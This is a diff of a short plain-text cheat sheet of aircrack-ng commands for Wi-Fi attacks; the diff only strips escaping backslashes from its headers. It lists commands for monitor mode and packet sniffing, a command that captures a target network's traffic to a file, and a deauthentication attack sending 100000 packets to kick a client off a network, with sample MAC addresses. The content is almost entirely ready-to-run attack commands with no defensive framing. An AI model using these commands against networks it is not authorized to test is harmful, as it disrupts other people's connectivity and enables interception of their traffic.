@@ -6,13 +6,13 @@ iwconfig  [interface] mode monitor
 ifconfig [interface] up
 
 STOP MONITOR MODE
-\-----------------------
+-----------------------
 ifconfig [interface] down
 iwconfig  [interface] mode managed
 ifconfig [interface] up
 
 START PACKET SNIFFING
-\-----------------------
+-----------------------
 airodump-ng [interface]
 
 BSSID [mac address of the target network]
@@ -28,23 +28,23 @@ AUTH [authentication used ]
 ESSID [name of wifi]
 
 START SNIFFING 5GHz
-\--------------------
+--------------------
 airodump-ng --band a [interface] - 5GHz
 airodump-ng --band abg [interface] - 5GHz and 2.4GHz (slightly snlower)
 airodump-ng --band b [interface] - 2.4GHz
 
 bands
-\------
+------
 a  : 5GHz
 b,g : 2.4GHz
 
 SNIFF SPECIFIC NETWORK
-\---------------------------
+---------------------------
 airodump-ng --bssid [bssid of network] --channel [channel of network] --write [store all data gathered to file[file name]] [interface]
 eg :
   airodump-ng --bssid AC:37:28:6A:3F:49 --channel 11 --write newText wlan0
 
 DEAUTHENTICATION ATTACK (Deauthenticate any Client)
-\---------------------------------------------------
+---------------------------------------------------
 aireplay-ng --deauth [Deauthpackets] -a [NetworkMAC] -c [Target Mac] [interface]
 eg: aireplay-ng --deauth 100000 -a AC:37:28:6A:3F:49 -c FA:76:1D:C8:AF:4A wlan0
